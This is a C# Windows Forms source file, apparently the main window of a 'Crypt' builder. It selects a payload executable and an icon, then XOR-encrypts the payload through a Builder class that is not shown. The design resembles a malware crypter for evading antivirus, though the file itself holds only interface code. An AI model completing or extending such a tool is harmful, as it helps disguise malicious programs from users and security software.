using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Crypt
{
    public partial class frmMain : Form
    {
        Options options;

        public frmMain()
        {
            InitializeComponent();
        }

        private void btnBrowsePayload_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog selectPayloadDialog = new OpenFileDialog())
            {
                selectPayloadDialog.Filter = "Executable files|*.exe";
                if(selectPayloadDialog.ShowDialog() == DialogResult.OK)
                {
                    txtPayload.Text = selectPayloadDialog.FileName;
                }
            }
        }

        private void btnBrowseIcon_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog selectIconDialog = new OpenFileDialog())
            {
                selectIconDialog.Filter = "Icon files|*.ico";
                if (selectIconDialog.ShowDialog() == DialogResult.OK)
                {
                    txtIcon.Text = selectIconDialog.FileName;
                }
            }
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog selectSaveDialog = new SaveFileDialog())
            {
                selectSaveDialog.Filter = "Executable files|*.exe";
                if (selectSaveDialog.ShowDialog() == DialogResult.OK)
                {
                    options.buildDir = selectSaveDialog.FileName;
                    Build();
                }
            }
        }

        private void Build()
        {
            options.encryptionKey = Encryption.GenerateKey();
            options.encryptionType = EncryptionType.XOR; //TODO: Delete
            Byte[] payloadPE = File.ReadAllBytes(txtPayload.Text);
            Builder builder = new Builder(payloadPE, options);
            builder.Build();
        }
    }
}
